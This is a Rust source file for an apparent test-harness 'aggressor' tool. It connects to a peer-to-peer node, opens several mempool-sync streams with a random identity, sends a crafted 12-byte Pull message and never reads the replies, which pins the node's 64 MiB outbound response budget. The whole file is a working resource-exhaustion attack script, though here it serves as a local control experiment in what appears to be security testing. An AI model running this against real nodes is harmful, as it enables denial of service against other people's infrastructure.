//! Anonymous non-reading mempool puller (C17-style control for the
//! gossip-halt lane). Opens `streams` mempool-sync streams with a fresh
//! random identity, sends the real 12-byte `Pull`, and never reads the
//! responses — pinning the victim's 64 MiB OUTBOUND response budget
//! (noid_p2p outbound_budget), a completely different mechanism from the
//! gossip byte window. Used to show that serving-budget pinning does NOT
//! drop block announcements.

use std::time::{Duration, Instant};

use anyhow::{Context, Result};
use futures::future::poll_fn;
use futures::AsyncWriteExt;

#[path = "../aggressor_common.rs"]
mod common;
use common::{conn_aware, connect, MEMPOOL_PROTOCOL};

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    let mut args: Vec<String> = std::env::args().skip(1).collect();
    let victim = args
        .first()
        .cloned()
        .context("usage: anon-mempool-pin 127.0.0.1:P2P [--streams N] [--duration-secs N] [--label L]")?;
    args.remove(0);
    let mut streams = 4usize;
    let mut duration_secs = 60u64;
    let mut label = String::from("pin");
    while !args.is_empty() {
        let flag = args.remove(0);
        let value = args.first().cloned().context("flag missing value")?;
        args.remove(0);
        match flag.as_str() {
            "--streams" => streams = value.parse()?,
            "--duration-secs" => duration_secs = value.parse()?,
            "--label" => label = value,
            other => anyhow::bail!("unknown flag {other}"),
        }
    }
    let deadline = Instant::now() + Duration::from_secs(duration_secs);
    println!(
        "[{label}] victim={victim} streams={streams} duration={duration_secs}s"
    );

    let mut connection = connect(&victim).await.context("transport")?;
    println!("[{label}] transport up");
    let mut pinned = 0usize;
    for _ in 0..streams {
        if Instant::now() >= deadline {
            break;
        }
        let stream = poll_fn(|cx| connection.poll_new_outbound(cx))
            .await
            .context("open stream")?;
        let mut stream = stream;
        // Negotiate and send the Pull while the connection is driven; the
        // finite future then hands the parked stream back.
        let setup = Box::pin(async {
            common::negotiate_outbound(&mut stream, MEMPOOL_PROTOCOL).await?;
            // 12-byte Pull: "NMR3" + kind 0 + 3 reserved + u32 len 0.
            stream
                .write_all(&[b'N', b'M', b'R', b'3', 0, 0, 0, 0, 0, 0, 0, 0])
                .await?;
            stream.flush().await?;
            Ok::<_, anyhow::Error>(stream)
        });
        match conn_aware(&mut connection, setup).await {
            Ok(Ok(stream)) => {
                // Hold the stream open forever, never reading: the node's
                // response fills the yamux window and pins the outbound
                // budget.
                tokio::spawn(async move {
                    let _hold = stream;
                    futures::future::pending::<()>().await;
                });
                pinned += 1;
            }
            other => {
                println!("[{label}] stream setup failed: {other:?}");
                break;
            }
        }
    }
    println!("[{label}] pinned {pinned} mempool streams; holding until deadline");
    let sleep = Box::pin(tokio::time::sleep_until(tokio::time::Instant::from_std(deadline)));
    conn_aware(&mut connection, sleep).await?;
    println!("[{label}] done");
    Ok(())
}
